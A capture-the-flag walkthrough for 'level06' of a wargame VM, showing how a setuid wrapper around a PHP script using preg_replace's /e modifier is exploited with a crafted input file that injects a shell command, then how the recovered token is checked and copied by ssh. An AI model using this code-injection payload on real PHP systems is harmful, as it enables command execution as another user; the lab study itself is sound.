# level06

## Steps

1. __Action__ (Guest): check the content of the `level06` user home directory once connected
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals 2 files possibly of interest,
	named `level06` and `level06.php`
	```
	.bash_logout  .bashrc  .profile  level06  level06.php
	```

3. __Action__ (Guest): check the permissions of both `level06` and `level06.php` files
	```sh
	getfacl level06 level06.php
	```

4. __Observation__ (Guest): the previous command reveals that:
	- the `level06` file:
		- is readable by the `level06` group
		- is executable by the `level06` group
		- has the `setuid` bit enabled
	- the `level06.php` file:
		- is readable by the `level06` group
		- is executable by the `level06` group
	```
	# file: level06
	# owner: flag06
	# group: level06
	# flags: s--
	user::rwx
	group::---
	group:level06:r-x
	mask::r-x
	other::---

	# file: level06.php
	# owner: flag06
	# group: level06
	user::rwx
	group::r-x
	other::---
	```

5. __Action__ (Guest): execute the `level06` file
	```sh
	./level06
	```

6. __Observation__ (Guest): the previous command prints the following message on stderr:
	```
	PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
	```

7. __Action__ (Guest): check the content of the `level06.php` file
	```sh
	less level06.php
	```

8. __Observation__ (Guest): as the file extension suggests, the `level06.php` file is a PHP script,
	which reads the content of a file, applies some transformations to it, and prints the result.
	The name of the file to read is passed as the first argument to the script,
	and the second argument is not used.
	```php
	#!/usr/bin/php
	<?php
	function y($m) {
		$m = preg_replace("/\./", " x ", $m);
		$m = preg_replace("/@/", " y", $m);
		return $m;
	}
	function x($y, $z) {
		$a = file_get_contents($y);

		# for each pattern of the form '[x something]',
		# evaluate the string `y("something")` as PHP code, and use the result as replacement
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

		# replace each '[' by a '(' and each ']' by a ')'
		$a = preg_replace("/\[/", "(", $a);
		$a = preg_replace("/\]/", ")", $a);

		return $a;
	}
	$r = x($argv[1], $argv[2]);
	print $r;
	?>
	```

9. __Action__ (Guest): create a file named `test` containing the string `[x hello.world@How@AreYou]`
	in the `/tmp` directory
	```sh
	echo '[x hello.world@How@AreYou]' >/tmp/test
	```

10. __Action__ (Guest): execute the `level06` file with the `/tmp/test` file as argument
	```sh
	./level06 /tmp/test
	```

11. __Observation__ (Guest): the previous command prints the following message on stdout:
	```
	hello x world yHow yAreYou
	```
	confirming that the `level06` file is actually executing the `level06.php` script.
	And because the `level06` has the `setuid` bit enabled, the script is executed with the
	privileges of the `flag06` user.

12. __Observation__ (Guest): the `level06.php` script uses the `/e` regex modifier
	in the first `preg_replace` call, which is a deprecated feature as it is known to be
	a security issue. Indeed, the `/e` modifier allows to evaluate the replacement string
	as PHP code, which can be used to execute arbitrary commands.
	This means that the `y("something")` function call is actually executed as PHP code,
	so the only thing we have to manage is to make `something` be a callback
	that will be invoked even in the double quotes context.

13. __Action__ (Guest): create a file named `exploit_php`
	containing the string ``[x ${`getflag >/tmp/getflag_as_flag06`}]``
	in the `/tmp` directory
	```sh
	echo '[x ${`getflag >/tmp/getflag_as_flag06`}]' >/tmp/exploit_php
	```

14. __Action__ (Guest): execute the `level06` file with the `/tmp/exploit_php` file as argument
	```sh
	./level06 /tmp/exploit_php
	```

15. __Action__ (Guest): check if the `getflag_as_flag06` file has been correctly created
	and contains the wanted output
	```sh
	less /tmp/getflag_as_flag06 || echo 'File does not exist'
	```

16. __Observation__ (Guest): the previous command reveals that the file has been created,
	and seems to contains the wanted token
	```
	Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
	```

17. __Action__ (Host): check if the token is correct by trying to connect as the `level07` user
	```sh
	sshpass -p wiok45aaoguiboiki2tuin6ub 2>/dev/null \
		ssh -p 4242 level07@192.168.122.214 exit \
	&& echo 'Great! The token is correct!' \
	|| echo 'Nop, the token is incorrect!'
	```

18. __Observation__ (Host): the previous command reveals that the token is correct,
	by printing the following message on stdout: `Great! The token is correct!`

19. __Action__ (Guest): extract the token from the `getflag_as_flag06` file
	```sh
	grep -oE '[^ ]+$' /tmp/getflag_as_flag06 >/tmp/token
	```

20. __Action__ (Host): copy the `token` file from the virtual machine
	```sh
	sshpass -f level05/flag 2>/dev/null \
		scp -P 4242 level06@192.168.122.214:/tmp/token level06/flag
	```

21. __Action__ (Guest): remove the `test`, `getflag_as_flag06`, and `token` files
	```sh
	rm /tmp/{'test','getflag_as_flag06','token'}
	```
